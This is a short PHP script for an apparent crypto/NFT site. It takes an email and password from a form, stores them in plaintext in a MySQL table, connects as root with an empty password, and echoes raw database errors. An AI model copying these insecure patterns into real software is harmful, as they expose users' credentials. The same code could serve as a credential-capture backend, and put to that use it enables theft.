<?php
session_start();

    $host = 'localhost';
    $db   = 'cryptofunk';
    $user = 'root';
    $pass = '';

    try {
        $conn = new PDO("mysql:host=$host;dbname=$db;charset=utf8", $user, $pass);
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        $query = "INSERT INTO tb_nfts (email, passwordkey) VALUES (:email, :passwordkey)";
        $stmt = $conn->prepare($query);

        $stmt->bindParam(':email', $_POST['email']);
        $stmt->bindParam(':passwordkey', $_POST['password']);
        $stmt->execute();

        header("Location: index.php");

    } catch (PDOException $e) {
        echo "Connection failed: " . $e->getMessage();
    }
?>